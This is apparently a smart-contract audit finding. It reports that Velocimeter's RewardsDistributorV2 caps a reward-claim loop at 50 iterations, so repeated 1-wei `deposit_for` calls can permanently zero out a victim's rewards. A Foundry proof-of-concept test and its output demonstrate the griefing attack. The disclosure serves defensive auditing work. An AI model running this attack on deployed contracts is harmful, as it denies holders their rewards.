Wonderful Coconut Corgi

High

# Attacker can grief anyone by permanently blocking their rewards

## Summary
A griefing vulnerability exists in the RewardsDistributorV2 contract that can permanently block token owners from claiming their rewards. This vulnerability can be exploited by a malicious user who repeatedly calls the `VotingEscrow.deposit_for() `function on a specific tokenId.

## Vulnerability Details
- The `_claim()` function in the `RewardsDistributorV2` contract calculates and distributes the amount of rewards claimable by users.
- To determine the amount of rewards to distribute to the user, the function must first locate the most recent userPoint that was recorded before the `last week_cursor.` (Then, based on their share compared to the total supply of ve and the current rate (tokens_per_week), rewards are distributed.)
- This is done by using a for loop, which starts from the last recorded `user_epoch` and runs until it finds a relevant `user_point` (point with timestamp greater than the last week cursor).
- This is done using a for loop, which starts from the last recorded user_epoch and runs until it finds a relevant `user_point` (a `user_point` with the highest timestamp value for given tokenId that is less than `last week_cursor`).

```solidity
for (uint i = 0; i < 50; i++) {
    if (week_cursor >= _last_token_time) break;

    if (week_cursor >= user_point.ts && user_epoch <= max_user_epoch) {
        user_epoch += 1;
        old_user_point = user_point;
        if (user_epoch > max_user_epoch) {
            user_point = IVotingEscrow.Point(0,0,0,0);
        } else {
            user_point = IVotingEscrow(ve).user_point_history(_tokenId, user_epoch);
        }
    } else {
        int128 dt = int128(int256(week_cursor - old_user_point.ts));
        uint balance_of = Math.max(uint(int256(old_user_point.bias - dt * old_user_point.slope)), 0);
        if (balance_of == 0 && user_epoch > max_user_epoch) break;
        if (balance_of != 0) {
            to_distribute += balance_of * tokens_per_week[week_cursor] / ve_supply[week_cursor];
        }
        week_cursor += WEEK;
    }
}
```
- However, the loop is limited to only 50 iterations. 
- If the total number of `user_point` exceeds this limit, the `_claim()` function will not be able to process beyond the 50th point, thus quitting before it finds the relevant point (i.e, never reaching the else block of the above snippet), resulting in `to_distribute` being set to 0.
- As a result, if there are more than 50 `user_point`, the function will fail to calculate and distribute any rewards.
- An attacker can achieve this state for any tokenId by repeatedly invoking the `VotingEscrow.deposit_for()` function.
- By making numerous deposits, even with minimal amounts such as 1 wei, the attacker can generate a large number of `user_point` associated with the tokenId.
- Consequently, the owner of the targeted TokeID will be permanently blocked from claiming their rewards.

## Impact
- Anyone can grief any user by permanently blocking their rewards in the contract.
- Given how easy it is to perform the attack and the severity of the impact, I am submitting this under high severity.

## Code Snippet
- https://github.com/sherlock-audit/2024-06-velocimeter/blob/63818925987a5115a80eff4bd12578146a844cfd/v4-contracts/contracts/RewardsDistributorV2.sol#L195

## POC
- Place the test in the `RewardsDistributorV2.t.sol` file of the test suite and run it using the command: "forge test --mt testGriefingRewardsDistribution -vv "

```solidity

function testGriefingRewardsDistribution() public {

    initializeVotingEscrow();
    DAI.transfer(address(distributor), 10*TOKEN_1);

    //Victim and normal users create a lock
    flowDaiPair.approve(address(escrow), 2*TOKEN_1);
    uint victimId = escrow.create_lock(TOKEN_1,52 weeks);
    uint normalId = escrow.create_lock(TOKEN_1,52 weeks);

    //Attacker creates redudant points for victims lock, inroder to grief them
    address Attacker = address(0x123);
    deal(address(flowDaiPair), Attacker, TOKEN_1);
    vm.startPrank(Attacker);
    flowDaiPair.approve(address(escrow), TOKEN_1);
    for (uint256 i; i < 60; i++) {
        escrow.deposit_for(victimId, 1);
        vm.roll(block.number + 1);
    }
    vm.stopPrank();

    //1st Epoch Finished
    _elapseOneWeek();
    voter.distribute();

    //2nd Epoch Finished
    _elapseOneWeek();
    voter.distribute();

    //Now, victim recieves zero rewards
    uint256 victim_reward = distributor.claim(victimId);
    uint256 normal_user_reward = distributor.claim(normalId);

    console.log("victim users reward : %d", victim_reward);
    console.log("normal users reward : %d", normal_user_reward);
    
}

```
- OutPut : 

```solidity
Ran 1 test for test/RewardsDistributorV2.t.sol:RewardsDistributorV2Test
[PASS] testGriefingRewardsDistribution() (gas: 69735531)
Logs:
  victim users reward : 0
  normal users reward : 4133591048956

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 16.43ms (11.13ms CPU time)
```

## Tool used
Manual Review and foundry

## Recommendation
Implement a binary search to find the nearest `user_point` to the` last week_cursor`.